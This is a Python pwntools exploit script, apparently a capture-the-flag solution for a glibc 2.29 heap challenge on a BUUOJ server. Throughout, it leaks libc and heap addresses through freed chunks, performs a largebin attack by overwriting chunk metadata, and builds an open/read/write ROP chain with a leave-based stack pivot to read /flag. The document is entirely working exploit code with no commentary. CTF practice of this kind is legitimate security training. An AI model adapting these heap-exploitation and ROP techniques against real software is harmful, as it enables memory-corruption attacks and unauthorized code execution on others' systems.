from pwn import *

io=remote('node3.buuoj.cn',25617)

def add(idx,size,data):
    io.recvuntil('input: ')
    io.sendline('1')
    io.recvuntil('idx: ')
    io.sendline(str(idx))
    io.recvuntil('): ')
    io.sendline(str(size))
    io.recvuntil('content: ')
    io.send(data)

def edit(idx,data):
    io.recvuntil('input: ')
    io.sendline('3')
    io.recvuntil('packet idx: ')
    io.sendline(str(idx))
    io.recvuntil('content: ')
    io.send(data)

def show(idx):
    io.recvuntil('input: ')
    io.sendline('4')
    io.recvuntil('idx: ')
    io.sendline(str(idx))

def free(idx):
    io.recvuntil('input: ')
    io.sendline('2')
    io.recvuntil('idx: ')
    io.sendline(str(idx))

def secret(data):
    io.recvuntil('input: ')
    io.sendline('666')
    io.recvuntil('to say?')
    io.send(data)

libc=ELF('./libc-2.29.so')

[add(i,4,'a') for i in range(7)]
add(8,3,'b')
add(7,4,'c')
add(13,1,'d')

[free(i) for i in range(8)]
show(7)
arena=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print(hex(arena))
libc_base=arena-0x1e4ca0

pop_rdi=libc_base+0x26542
pop_rsi=libc_base+0x026f9e 
pop_rdx=libc_base+0x12bda6 
leave=libc_base+0x58373 
data=libc_base+0x01E9430

show(3)
heap=u64(io.recv(6).ljust(8,'\x00'))-0x1830
print(hex(heap))

target=heap+0x802

add(9,4,'a')

[add(i,3,'a') for i in range(8)]
add(10,4,'c')
add(11,4,'e')

[free(i) for i in range(6)]
free(7)

free(8)
free(9)

[add(i,2,'d') for i in range(3)]
add(3,1,'e') #unsortbin size 0x400
free(6)#ubsortbin size 0x310
add(6,3,'f')#0x400 into largebin
free(10)
free(6)
edit(9,p64(0)+p64(0x401)+p64(arena+0x3f0)*2+p64(0)+p64(target-0x20))

rop_add=heap+0x4620
rop="/flag\x00\x00\x00"
rop+=p64(pop_rdi)+p64(rop_add)+p64(pop_rsi)+p64(0)+p64(libc_base+libc.sym['open'])
rop+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(data)+p64(pop_rdx)+p64(0x100)+p64(libc_base+libc.sym['read'])
rop+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(data)+p64(pop_rdx)+p64(0x100)+p64(libc_base+libc.sym['write'])

add(6,3,rop)
pl='a'*0x80+p64(rop_add)+p64(leave)
secret(pl)


io.interactive()